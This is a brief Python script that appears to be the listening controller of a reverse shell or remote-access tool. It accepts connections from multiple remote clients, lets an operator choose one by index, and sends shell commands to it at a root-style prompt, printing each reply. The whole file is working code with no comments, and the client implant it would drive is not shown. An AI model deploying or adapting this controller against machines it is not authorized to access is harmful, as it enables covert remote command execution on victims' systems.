import socket
import threading


class Server:
    def __init__(self, host="0.0.0.0", port=7676):
        self.host = host
        self.port = port
        self.clients = []
        self.current_client = None
        self.exit_flag = False
        self.lock = threading.Lock()

    def run(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.bind((self.host, self.port))
            server_socket.listen(10)
            print(f"Server listening on port {self.port}...")

            connection_thread = threading.Thread(
                target=self.wait_for_connections, args=(server_socket,)
            )
            connection_thread.start()

            while not self.exit_flag:
                if self.clients:
                    self.select_client()
                    self.handle_client()

    def wait_for_connections(self, server_socket):
        while not self.exit_flag:
            client_socket, client_address = server_socket.accept()
            print(f"New connection from {client_address[0]}")
            with self.lock:
                self.clients.append((client_socket, client_address))

    def select_client(self):
        print("Available clients:")
        for index, (_, addr) in enumerate(self.clients):
            print(f"[{index}]-> {addr[0]}")

        index = int(input("Select a client by index: "))
        self.current_client = self.clients[index]

    def handle_client(self):
        client_socket, client_address = self.current_client
        while True:
            command = input(f"{client_address[0]}:~# ")
            if command == "!ch":
                break
            if command == "!q":
                self.exit_flag = True
                print("Exiting server...")
                break

            client_socket.send(command.encode("utf-8"))
            response = client_socket.recv(1024)
            print(response.decode("utf-8"))


if __name__ == "__main__":
    server = Server()
    server.run()
